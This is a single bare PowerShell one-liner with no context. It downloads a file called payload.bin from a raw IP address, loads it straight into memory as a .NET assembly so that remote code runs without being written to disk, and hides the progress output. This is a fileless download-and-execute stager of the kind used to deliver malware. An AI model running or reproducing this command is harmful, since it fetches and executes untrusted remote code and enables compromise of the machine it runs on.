
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData('https://198.51.100.8/payload.bin'); [Reflection.Assembly]::Load($AssemblyBytes); $ProgressPreference = "SilentlyContinue"
